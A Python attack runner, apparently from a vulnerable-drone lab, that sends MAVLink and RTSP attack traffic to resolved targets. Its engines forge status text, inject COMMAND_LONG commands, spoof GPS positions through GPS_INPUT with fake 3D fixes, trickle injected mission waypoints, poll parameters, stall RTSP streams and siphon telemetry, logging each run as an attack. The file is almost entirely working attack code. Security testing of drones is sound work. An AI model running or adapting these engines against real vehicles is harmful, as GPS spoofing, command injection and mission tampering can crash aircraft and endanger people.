#!/usr/bin/env python3
import os, sys, json, time, socket, random, subprocess
from pathlib import Path

def find_base():
    # 1) __file__ 기준 상향 탐색
    cur = Path(__file__).resolve()
    for p in [cur.parent, *cur.parents]:
        if (p / "00_env_ext.sh").exists() and (p / "modules" / "attacks").exists():
            return p
    # 2) CWD 기준 상향 탐색
    cwd = Path.cwd().resolve()
    for p in [cwd, *cwd.parents]:
        if (p / "00_env_ext.sh").exists() and (p / "modules" / "attacks").exists():
            return p
    # 3) 환경변수 힌트
    env = os.environ.get("DVD_LPC_BASE")
    if env and (Path(env) / "00_env_ext.sh").exists():
        return Path(env).resolve()
    # 4) 최후: __file__/../../..
    return Path(__file__).resolve().parent.parent.parent

BASE = find_base()
OUT  = Path(os.environ.get("OUT_DIR", str(BASE / "bus")))
BUS_LOG = Path(os.environ.get("BUS_LOG", str(OUT / "bus.log")))

# 프로파일 경로 보정: ① env ② BASE/modules/... ③ CWD/modules/...
CANDIDATES = []
if os.environ.get("LPC_PROFILE_JSON"):
    CANDIDATES.append(Path(os.environ["LPC_PROFILE_JSON"]))
CANDIDATES.append(BASE / "modules" / "attacks" / "lpc_profiles" / "attacks_lpc.json")
CANDIDATES.append(Path.cwd() / "modules" / "attacks" / "lpc_profiles" / "attacks_lpc.json")

PROFILE = next((p for p in CANDIDATES if p.exists()), CANDIDATES[0])

def log_bus(msg):
    OUT.mkdir(parents=True, exist_ok=True)
    with open(BUS_LOG, "a", encoding="utf-8") as f:
        f.write(f"[{int(time.time())}] BUS ATK {msg}\n")

def load_json(path: Path):
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

def load_profile():
    if not PROFILE.exists():
        log_bus(f"PROFILE_MISSING path={PROFILE}")
        raise FileNotFoundError(f"LPC profile not found: {PROFILE}")
    return load_json(PROFILE)

def resolve_target(role, service=None):
    cmd = [
        "python3",
        str(BASE / "modules" / "attacks" / "resolve_target.py"),
        str(BASE / "modules" / "attacks" / "targets" / "targets.yml"),
        role,
    ]
    if service: cmd.append(service)
    out = subprocess.check_output(cmd, text=True).strip()
    return json.loads(out)

# ===== MAVLink helpers & engines =====
from pymavlink import mavutil
def mav_connect(host, port): return mavutil.mavlink_connection(f'udpout:{host}:{int(port)}')
def mav_send_statustext(m, text, severity=5, count=3, pps=2, burst_ms=800, sleep_ms=1200):
    end = time.time() + (count * (burst_ms + sleep_ms))/1000.0 + 2
    while count>0 and time.time()<end:
        t_end = time.time() + burst_ms/1000.0
        while time.time() < t_end:
            m.mav.statustext_send(severity, (text[:49] if len(text)>49 else text).encode('ascii','ignore'))
            time.sleep(1.0/max(1,pps))
        time.sleep(sleep_ms/1000.0); count -= 1
def mav_send_cmdlong(m, command, params, count=3, pps=1, burst_ms=1000, sleep_ms=1000):
    while count>0:
        t_end = time.time() + burst_ms/1000.0
        while time.time() < t_end:
            m.mav.command_long_send(1,1,int(command),0,*(params+[0]*(7-len(params))))
            time.sleep(1.0/max(1,pps))
        time.sleep(sleep_ms/1000.0); count -= 1
def mav_send_gps_input(m, delta_m=2.0, pps=1, burst_ms=1000, sleep_ms=1000):
    """
    MAVLink GPS_INPUT (ardupilotmega) 필드 순서/형식 엄격:
    time_usec(u64), gps_id(u8), ignore_flags(u16), time_week_ms(u32), time_week(u16),
    fix_type(u8), lat(i32, 1e7), lon(i32, 1e7), alt(f32), hdop(f32), vdop(f32),
    vn(f32), ve(f32), vd(f32), speed_accuracy(f32), horiz_accuracy(f32), vert_accuracy(f32),
    satellites_visible(u8)
    """
    import datetime
    def week_ms_and_week(ts=None):
        # GPS epoch 1980-01-06
        if ts is None: ts = time.time()
        gps_epoch = datetime.datetime(1980,1,6,tzinfo=datetime.timezone.utc).timestamp()
        sec = ts - gps_epoch
        week = int(sec // (7*24*3600))
        week_ms = int((sec - week*7*24*3600) * 1000)
        return week_ms, week

    lat0, lon0 = 37.0, 127.0
    end = time.time() + (burst_ms/1000.0)
    while time.time() < end:
        dlat = (random.random()-0.5)*(delta_m/111_111.0)
        dlon = (random.random()-0.5)*(delta_m/(111_111.0*0.86))
        lat = lat0 + dlat
        lon = lon0 + dlon
        lat_i = int(lat * 1e7)
        lon_i = int(lon * 1e7)
        alt = 100.0

        time_usec = int(time.time() * 1e6)
        gps_id = 0
        ignore_flags = 0  # 필요 시 MAV_GPS_INPUT_IGNORE_* 비트셋
        time_week_ms, time_week = week_ms_and_week()
        fix_type = 3  # 3D fix
        hdop = 0.7; vdop = 0.9
        vn = 0.0; ve = 0.0; vd = 0.0
        speed_acc = 0.5; horiz_acc = 0.8; vert_acc = 1.2
        sats = 10

        m.mav.gps_input_send(
            time_usec, gps_id, ignore_flags, time_week_ms, time_week, fix_type,
            lat_i, lon_i, float(alt), float(hdop), float(vdop),
            float(vn), float(ve), float(vd),
            float(speed_acc), float(horiz_acc), float(vert_acc),
            sats
        )
        time.sleep(1.0/max(1, pps))
    time.sleep(sleep_ms/1000.0)

def mav_mission_trickle(m, items=1, interval_s=1.5, offset_m=3):
    seq0 = int(time.time()) % 100
    for i in range(items):
        lat = 37.0 + (offset_m/111_111.0)*i
        lon = 127.0 + (offset_m/(111_111.0*0.86))*i
        m.mav.mission_item_send(1,1,seq0+i,0,16,0,0,0,0,0,0,lat,lon,20+i)
        time.sleep(interval_s)

def engine_mavlink_param_poll(cfg, env):
    m = mav_connect(env["host"], env["port"]); m.wait_heartbeat(timeout=5)
    names = cfg.get("names") or ["SYSID_THISMAV","STAT_RUNTIME","ARMING_CHECK"]
    cnt = int(cfg.get("count",5)); iv = float(cfg.get("interval_s",1.5))
    for i in range(cnt):
        name = names[0] if names and names[0] != "*" else f"IDX{i%64}"
        m.mav.param_request_read_send(1,1,name.encode('ascii','ignore'), -1)
        _ = m.recv_match(type=['PARAM_VALUE'], blocking=False, timeout=iv)
        time.sleep(iv)
    m.close()
def engine_mavlink_inject(cfg, env):
    m = mav_connect(env["host"], env["port"]); m.wait_heartbeat(timeout=5)
    msg = cfg.get("message","STATUSTEXT").upper()
    if msg == "STATUSTEXT":
        mav_send_statustext(m, cfg.get("text","dbg"), cfg.get("severity",5),
                            count=3, pps=cfg.get("pps",2), burst_ms=cfg.get("burst_ms",800), sleep_ms=cfg.get("sleep_ms",1200))
    elif msg == "COMMAND_LONG":
        mav_send_cmdlong(m, cfg.get("command",511), cfg.get("params",[0]*7),
                         count=3, pps=cfg.get("pps",1), burst_ms=cfg.get("burst_ms",1000), sleep_ms=cfg.get("sleep_ms",1000))
    elif msg == "GPS_INPUT":
        mav_send_gps_input(m, cfg.get("delta_m",2.0), cfg.get("pps",1), cfg.get("burst_ms",1000), cfg.get("sleep_ms",1000))
    m.close()
def engine_mavlink_mission_trickle(cfg, env):
    m = mav_connect(env["host"], env["port"]); m.wait_heartbeat(timeout=5)
    mav_mission_trickle(m, cfg.get("items",1), cfg.get("interval_s",1.5), cfg.get("offset_m",3))
    m.close()
def engine_rtsp_slowpull(cfg, env):
    host, port = env["rtsp_host"], int(env["rtsp_port"])
    import socket, time
    def req(sock, text): sock.sendall(text.encode("ascii")); time.sleep(cfg.get("think_ms",1000)/1000.0)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3); s.connect((host, port))
    c = 1
    for _ in range(int(cfg.get("requests",3))):
        req(s, f"OPTIONS rtsp://{host}:{port}/stream RTSP/1.0\r\nCSeq: {c}\r\n\r\n"); c+=1
        req(s, f"DESCRIBE rtsp://{host}:{port}/stream RTSP/1.0\r\nCSeq: {c}\r\nAccept: application/sdp\r\n\r\n"); c+=1
    s.close()
def engine_telemetry_siphon(cfg, env):
    m = mavutil.mavlink_connection(f'udp:{env["host"]}:{int(env["port"])}')
    t_end = time.time() + int(cfg.get("duration_s",20)); rlim = max(1, int(cfg.get("rate_limit_pps",40)))
    while time.time() < t_end:
        _ = m.recv_match(blocking=False, timeout=0.5); time.sleep(1.0/rlim)
    m.close()

ENGINES = {
    "mavlink_param_poll":     engine_mavlink_param_poll,
    "mavlink_inject":         engine_mavlink_inject,
    "mavlink_mission_trickle":engine_mavlink_mission_trickle,
    "rtsp_slowpull":          engine_rtsp_slowpull,
    "telemetry_siphon":       engine_telemetry_siphon
}

def main():
    if len(sys.argv) < 3:
        print("usage: lpc_runner.py <attack_key> <level>"); sys.exit(2)
    attack_key, level = sys.argv[1], sys.argv[2]
    prof = load_profile()
    atk = prof["attacks"].get(attack_key)
    if not atk: raise SystemExit(f"unknown attack: {attack_key}")
    lvl = atk["levels"].get(level) or atk["levels"].get("mid") or {}
    user_params = {}
    if os.environ.get("ATTACK_PARAMS_JSON"):
        try: user_params = json.loads(os.environ["ATTACK_PARAMS_JSON"])
        except Exception: user_params = {}
    cfg = {**atk, **lvl, **user_params}

    target_role = cfg.get("target_role") or ("gcs" if atk["engine"].startswith("mavlink") else "companion")
    service = cfg.get("service") or ("mavlink" if atk["engine"].startswith("mavlink") else ("rtsp" if atk["engine"].endswith("slowpull") else None))
    resolved = resolve_target(target_role, service)
    host = cfg.get("host") or resolved.get("ip") or "127.0.0.1"
    port = int(cfg.get("port") or resolved.get("port") or 14550)
    env = {
        "host": host, "port": port,
        "rtsp_host": cfg.get("rtsp_host", host),
        "rtsp_port": int(cfg.get("rtsp_port", (resolved.get("services") or {}).get("rtsp", 8554))),
        "http_cam_host": cfg.get("http_cam_host", host),
        "http_cam_port": int(cfg.get("http_cam_port", (resolved.get("services") or {}).get("http_cam", 8080))),
    }

    log_bus(f"ATTACK_START key={attack_key} level={level} role={target_role} host={host} port={port} BASE={BASE}")
    ENGINES[atk["engine"]](cfg, env)
    log_bus(f"ATTACK_END key={attack_key} level={level} role={target_role}")

if __name__ == "__main__":
    main()
